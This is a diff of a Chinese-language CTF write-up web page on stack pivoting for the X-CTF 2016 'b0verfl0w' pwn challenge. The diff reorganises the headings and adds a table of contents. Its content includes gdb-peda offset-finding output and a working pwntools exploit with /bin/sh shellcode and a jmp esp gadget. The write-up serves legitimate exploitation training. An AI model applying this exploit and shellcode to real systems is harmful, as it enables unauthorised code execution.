@@ -93,7 +93,7 @@
 <meta property="og:image" content="https://i.loli.net/2019/10/16/kwI1Yyvx48fnTD7.jpg">
 <meta property="og:image" content="https://i.loli.net/2019/10/16/zN6VkZUefGBjIOt.png">
 <meta property="og:image" content="https://i.loli.net/2019/10/16/GFbUjTdvkaJ6OE8.jpg">
-<meta property="og:updated_time" content="2019-10-19T04:23:08.996Z">
+<meta property="og:updated_time" content="2019-10-20T05:27:17.581Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="b0verfl0w_X-CTF Quals 2016">
 <meta name="twitter:description" content="题目地址：b0verfl0w">
@@ -381,42 +381,33 @@
         <p>题目地址：<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF%20Quals%202016%20-%20b0verfl0w" target="_blank" rel="noopener">b0verfl0w</a></p>
 <a id="more"></a>
 
-<p>1.先看看一些基本信息</p>
-<p><img src="https://i.loli.net/2019/10/16/JguFUIOkixjbspS.png" alt="sk_pt1.png"></p>
-<p>2.查看保护</p>
-<p><img src="https://i.loli.net/2019/10/16/ydTKs4cStGwpQ2u.png" alt="sk_pt2.png"></p>
-<p>3.IDA查看反汇编代码</p>
-<p><img src="https://i.loli.net/2019/10/16/diAfusySkZ8XQbJ.png" alt="sk_pt3.png"></p>
-<p>可以看到vul()函数存在栈溢出漏洞，但是很明显我们可以利用的空间并不大，由上图注释，s到bp距离为20字节，而bp占4字节，所以能溢出的栈空间只有50-0x20-4=14字节。所以我们再进行ROP技术就变的困难许多。</p>
+<h1 id="1-基本信息收集"><a href="#1-基本信息收集" class="headerlink" title="1.基本信息收集"></a>1.基本信息收集</h1><h2 id="1-文件信息"><a href="#1-文件信息" class="headerlink" title="1.文件信息"></a>1.文件信息</h2><p><img src="https://i.loli.net/2019/10/16/JguFUIOkixjbspS.png" alt="sk_pt1.png"></p>
+<h2 id="2-查看保护"><a href="#2-查看保护" class="headerlink" title="2.查看保护"></a>2.查看保护</h2><p><img src="https://i.loli.net/2019/10/16/ydTKs4cStGwpQ2u.png" alt="sk_pt2.png"></p>
+<h2 id="3-IDA查看反汇编代码"><a href="#3-IDA查看反汇编代码" class="headerlink" title="3.IDA查看反汇编代码"></a>3.IDA查看反汇编代码</h2><p><img src="https://i.loli.net/2019/10/16/diAfusySkZ8XQbJ.png" alt="sk_pt3.png"></p>
+<h1 id="2-漏洞定位及利用思路"><a href="#2-漏洞定位及利用思路" class="headerlink" title="2.漏洞定位及利用思路"></a>2.漏洞定位及利用思路</h1><h2 id="Stack-pivot"><a href="#Stack-pivot" class="headerlink" title="Stack pivot"></a>Stack pivot</h2><p>可以看到vul()函数存在栈溢出漏洞，但是很明显我们可以利用的空间并不大，由上图注释，s到bp距离为20字节，而bp占4字节，所以能溢出的栈空间只有50-0x20-4=14字节。所以我们再进行ROP技术就变的困难许多。</p>
 <p>不过我们可以用Stack pivot（劫持栈指针）的方法，下面简单介绍一下，内容摘自ctf-wiki。</p>
-<p><strong>是什么？</strong></p>
-<p>劫持栈指针（Stack pivot）就是改写rsp(esp)，使其指向其他位置。这样栈也就被劫持到攻击者控制的内存上去，然后在该位置做ROP。</p>
-<p><strong>为什么？</strong></p>
-<p>1.可以控制的栈溢出的字节比较少，难以构造较长的ROP链，无法直接利用溢出字节进行ROP</p>
+<h3 id="是什么？"><a href="#是什么？" class="headerlink" title="是什么？"></a><strong>是什么？</strong></h3><p>劫持栈指针（Stack pivot）就是改写rsp(esp)，使其指向其他位置。这样栈也就被劫持到攻击者控制的内存上去，然后在该位置做ROP。</p>
+<h3 id="为什么？"><a href="#为什么？" class="headerlink" title="为什么？"></a><strong>为什么？</strong></h3><p>1.可以控制的栈溢出的字节比较少，难以构造较长的ROP链，无法直接利用溢出字节进行ROP</p>
 <p>2.开启了PIE保护，栈地址未知，并且无法泄露，但是利用某些技术（如ret2dl-resolve）时，必须知道栈地址，可以通过stack pivot将栈劫持到相应的区域</p>
 <p>3.其它漏洞难以利用，stack pivot 能够将一些非栈溢出的漏洞，变成栈溢出的漏洞，例如，将程序劫持到堆空间中。</p>
-<p><strong>利用条件：</strong></p>
-<p>如果在尝试了直接Rop发现比较难实现，并且程序中有可以利用进行读写的函数，就可以考虑stack pivot</p>
+<h3 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a><strong>利用条件：</strong></h3><p>如果在尝试了直接Rop发现比较难实现，并且程序中有可以利用进行读写的函数，就可以考虑stack pivot</p>
 <p>1.可以控制程序执行流</p>
 <p>2.存在地址已知，内容可控的Buffer<br>        (1) BSS，由于进程按页分配内存，分配给bss段的内存大小至少一个页(4k,0x1000)大小。然而一般bss段的内容用不了这么多的空间，并且bss段分配的内存页拥有读写权限</p>
 <p>​        (2) 堆，但是需要我们能够泄露堆地址</p>
 <p>3.可以控制sp指针，一般来说，控制栈指针会使用 ROP，常见的控制栈指针的 gadgets 一般是 pop rsp/esp</p>
-<p>再回到题目：</p>
-<p>由于可以控制的栈溢出的字节比较少，难以构造较长的ROP链，无法直接利用溢出字节进行ROP，但是满足Stack pivot的利用条件，所以本题可以用Stack pivot。</p>
+<h2 id="再回到题目："><a href="#再回到题目：" class="headerlink" title="再回到题目："></a>再回到题目：</h2><p>由于可以控制的栈溢出的字节比较少，难以构造较长的ROP链，无法直接利用溢出字节进行ROP，但是满足Stack pivot的利用条件，所以本题可以用Stack pivot。</p>
 <p>注意到存在一个hint函数，反汇编查看一下;</p>
 <p><img src="https://i.loli.net/2019/10/16/kwI1Yyvx48fnTD7.jpg" alt="sk_pt4.jpg"></p>
 <p>这是一个很重要的提示，我们稍后会用到。</p>
 <p>接下来按照正常栈溢出的题目的套路来：</p>
-<p><strong>1.找填充值</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern create 100 /tmp/input</span><br><span class="line">Writing pattern of 100 chars to filename &quot;/tmp/input&quot;</span><br><span class="line">gdb-peda$ r &lt; /tmp/input</span><br><span class="line">Starting program: /home/hc/study/pwn/stackoverflow/stack pivoting/b0verfl0w &lt; /tmp/input</span><br><span class="line"></span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line">Welcome to X-CTF 2016!</span><br><span class="line"></span><br><span class="line">======================</span><br><span class="line">What&apos;s your name?</span><br><span class="line">Hello AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb.</span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line"></span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x1 </span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0xf7fb5890 --&gt; 0x0 </span><br><span class="line">EDX: 0x0 </span><br><span class="line">ESI: 0xf7fb4000 --&gt; 0x1d4d6c </span><br><span class="line">EDI: 0x0 </span><br><span class="line">EBP: 0x41412941 (&apos;A)AA&apos;)</span><br><span class="line">ESP: 0xffffce90 (&quot;AA0AAFAAb&quot;)</span><br><span class="line">EIP: 0x61414145 (&apos;EAAa&apos;)</span><br><span class="line">EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid $PC address: 0x61414145</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffce90 (&quot;AA0AAFAAb&quot;)</span><br><span class="line">0004| 0xffffce94 (&quot;AFAAb&quot;)</span><br><span class="line">0008| 0xffffce98 --&gt; 0x62 (&apos;b&apos;)</span><br><span class="line">0012| 0xffffce9c --&gt; 0xf7df7e81 (&lt;__libc_start_main+241&gt;:   add    esp,0x10)</span><br><span class="line">0016| 0xffffcea0 --&gt; 0x1 </span><br><span class="line">0020| 0xffffcea4 --&gt; 0xffffcf34 --&gt; 0xffffd123 (&quot;/home/hc/study/pwn/stackoverflow/stack pivoting/b0verfl0w&quot;)</span><br><span class="line">0024| 0xffffcea8 --&gt; 0xffffcf3c --&gt; 0xffffd15d (&quot;XDG_SEAT=seat0&quot;)</span><br><span class="line">0028| 0xffffceac --&gt; 0xffffcec4 --&gt; 0x0 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x61414145 in ?? ()</span><br><span class="line">gdb-peda$ pattern search</span><br><span class="line">Registers contain pattern buffer:</span><br><span class="line">EBP+0 found at offset: 32</span><br><span class="line">EIP+0 found at offset: 36</span><br><span class="line">Registers point to pattern buffer:</span><br><span class="line">[ESP] --&gt; offset 40 - size ~9</span><br><span class="line">Pattern buffer found at:</span><br><span class="line">0x0804b166 : offset    0 - size   49 ([heap])</span><br><span class="line">0x0804b570 : offset    0 - size  100 ([heap])</span><br><span class="line">0xffffce68 : offset    0 - size   49 ($sp + -0x28 [-10 dwords])</span><br><span class="line">References to pattern buffer found at:</span><br><span class="line">0xf7fb45cc : 0x0804b570 (/lib32/libc-2.27.so)</span><br><span class="line">0xf7fb45d0 : 0x0804b570 (/lib32/libc-2.27.so)</span><br><span class="line">0xf7fb45d4 : 0x0804b570 (/lib32/libc-2.27.so)</span><br><span class="line">0xf7fb45d8 : 0x0804b570 (/lib32/libc-2.27.so)</span><br><span class="line">0xf7fb45dc : 0x0804b570 (/lib32/libc-2.27.so)</span><br><span class="line">0xffffcd08 : 0x0804b570 ($sp + -0x188 [-98 dwords])</span><br><span class="line">0xffffc984 : 0xffffce68 ($sp + -0x50c [-323 dwords])</span><br><span class="line">0xffffcdac : 0xffffce68 ($sp + -0xe4 [-57 dwords])</span><br><span class="line">0xffffce54 : 0xffffce68 ($sp + -0x3c [-15 dwords])</span><br></pre></td></tr></table></figure>
+<h1 id="3-利用步骤"><a href="#3-利用步骤" class="headerlink" title="3.利用步骤"></a>3.利用步骤</h1><h2 id="1-找填充值"><a href="#1-找填充值" class="headerlink" title="1.找填充值"></a><strong>1.找填充值</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern create 100 /tmp/input</span><br><span class="line">Writing pattern of 100 chars to filename &quot;/tmp/input&quot;</span><br><span class="line">gdb-peda$ r &lt; /tmp/input</span><br><span class="line">Starting program: /home/hc/study/pwn/stackoverflow/stack pivoting/b0verfl0w &lt; /tmp/input</span><br><span class="line"></span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line">Welcome to X-CTF 2016!</span><br><span class="line"></span><br><span class="line">======================</span><br><span class="line">What&apos;s your name?</span><br><span class="line">Hello AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb.</span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line"></span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x1 </span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0xf7fb5890 --&gt; 0x0 </span><br><span class="line">EDX: 0x0 </span><br><span class="line">ESI: 0xf7fb4000 --&gt; 0x1d4d6c </span><br><span class="line">EDI: 0x0 </span><br><span class="line">EBP: 0x41412941 (&apos;A)AA&apos;)</span><br><span class="line">ESP: 0xffffce90 (&quot;AA0AAFAAb&quot;)</span><br><span class="line">EIP: 0x61414145 (&apos;EAAa&apos;)</span><br><span class="line">EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid $PC address: 0x61414145</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffce90 (&quot;AA0AAFAAb&quot;)</span><br><span class="line">0004| 0xffffce94 (&quot;AFAAb&quot;)</span><br><span class="line">0008| 0xffffce98 --&gt; 0x62 (&apos;b&apos;)</span><br><span class="line">0012| 0xffffce9c --&gt; 0xf7df7e81 (&lt;__libc_start_main+241&gt;:   add    esp,0x10)</span><br><span class="line">0016| 0xffffcea0 --&gt; 0x1 </span><br><span class="line">0020| 0xffffcea4 --&gt; 0xffffcf34 --&gt; 0xffffd123 (&quot;/home/hc/study/pwn/stackoverflow/stack pivoting/b0verfl0w&quot;)</span><br><span class="line">0024| 0xffffcea8 --&gt; 0xffffcf3c --&gt; 0xffffd15d (&quot;XDG_SEAT=seat0&quot;)</span><br><span class="line">0028| 0xffffceac --&gt; 0xffffcec4 --&gt; 0x0 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x61414145 in ?? ()</span><br><span class="line">gdb-peda$ pattern search</span><br><span class="line">Registers contain pattern buffer:</span><br><span class="line">EBP+0 found at offset: 32</span><br><span class="line">EIP+0 found at offset: 36</span><br><span class="line">Registers point to pattern buffer:</span><br><span class="line">[ESP] --&gt; offset 40 - size ~9</span><br><span class="line">Pattern buffer found at:</span><br><span class="line">0x0804b166 : offset    0 - size   49 ([heap])</span><br><span class="line">0x0804b570 : offset    0 - size  100 ([heap])</span><br><span class="line">0xffffce68 : offset    0 - size   49 ($sp + -0x28 [-10 dwords])</span><br><span class="line">References to pattern buffer found at:</span><br><span class="line">0xf7fb45cc : 0x0804b570 (/lib32/libc-2.27.so)</span><br><span class="line">0xf7fb45d0 : 0x0804b570 (/lib32/libc-2.27.so)</span><br><span class="line">0xf7fb45d4 : 0x0804b570 (/lib32/libc-2.27.so)</span><br><span class="line">0xf7fb45d8 : 0x0804b570 (/lib32/libc-2.27.so)</span><br><span class="line">0xf7fb45dc : 0x0804b570 (/lib32/libc-2.27.so)</span><br><span class="line">0xffffcd08 : 0x0804b570 ($sp + -0x188 [-98 dwords])</span><br><span class="line">0xffffc984 : 0xffffce68 ($sp + -0x50c [-323 dwords])</span><br><span class="line">0xffffcdac : 0xffffce68 ($sp + -0xe4 [-57 dwords])</span><br><span class="line">0xffffce54 : 0xffffce68 ($sp + -0x3c [-15 dwords])</span><br></pre></td></tr></table></figure>
 
 <p>填充值为36。所以我们需要填充36字节的垃圾值然后跟上要返回的地址(4字节)</p>
 <p>我们的payload可以构造如下：</p>
 <p><img src="https://i.loli.net/2019/10/16/zN6VkZUefGBjIOt.png" alt="sk_pt5.png"></p>
 <p>0x08048504为jmp esp 的gadgets（看前面提到的hint），覆盖了返回地址，当程序执行到ret时，将该地址pop给eip，并且esp会加4指向asm(sub esp,0x28;jmp esp),然后eip执行地址0x08048504上的代码jmp esp，eip又会执行esp指向的sub esp,0x28;jmp esp，完成esp的劫持。正常情况下eip指向的是.text段中的代码，所以需要将sub esp,0x28;jmp esp转化为机器码，这里是十六进制机器码。</p>
 <p>至于为什么是sub 0x28，36byte+4byte=40byte=0x28byte。</p>
-<p><strong>2.编写exp</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./b0verfl0w&apos;)</span><br><span class="line"></span><br><span class="line">jmp_esp = 0x08048504</span><br><span class="line">shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;</span><br><span class="line">payload = shellcode + &apos;A&apos; * (36 - len(shellcode)) + p32(jmp_esp) + asm(&apos;sub esp, 0x28;jmp esp&apos;)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="2-编写exp"><a href="#2-编写exp" class="headerlink" title="2.编写exp"></a><strong>2.编写exp</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./b0verfl0w&apos;)</span><br><span class="line"></span><br><span class="line">jmp_esp = 0x08048504</span><br><span class="line">shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;</span><br><span class="line">payload = shellcode + &apos;A&apos; * (36 - len(shellcode)) + p32(jmp_esp) + asm(&apos;sub esp, 0x28;jmp esp&apos;)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://i.loli.net/2019/10/16/GFbUjTdvkaJ6OE8.jpg" alt="sk_pt6.jpg"></p>
 
@@ -513,8 +504,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -531,7 +531,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -544,7 +544,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-count">5</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
@@ -597,6 +597,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-基本信息收集"><span class="nav-number">1.</span> <span class="nav-text">1.基本信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-文件信息"><span class="nav-number">1.1.</span> <span class="nav-text">1.文件信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-查看保护"><span class="nav-number">1.2.</span> <span class="nav-text">2.查看保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-IDA查看反汇编代码"><span class="nav-number">1.3.</span> <span class="nav-text">3.IDA查看反汇编代码</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-漏洞定位及利用思路"><span class="nav-number">2.</span> <span class="nav-text">2.漏洞定位及利用思路</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Stack-pivot"><span class="nav-number">2.1.</span> <span class="nav-text">Stack pivot</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#是什么？"><span class="nav-number">2.1.1.</span> <span class="nav-text">是什么？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#为什么？"><span class="nav-number">2.1.2.</span> <span class="nav-text">为什么？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用条件："><span class="nav-number">2.1.3.</span> <span class="nav-text">利用条件：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#再回到题目："><span class="nav-number">2.2.</span> <span class="nav-text">再回到题目：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-利用步骤"><span class="nav-number">3.</span> <span class="nav-text">3.利用步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-找填充值"><span class="nav-number">3.1.</span> <span class="nav-text">1.找填充值</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-编写exp"><span class="nav-number">3.2.</span> <span class="nav-text">2.编写exp</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
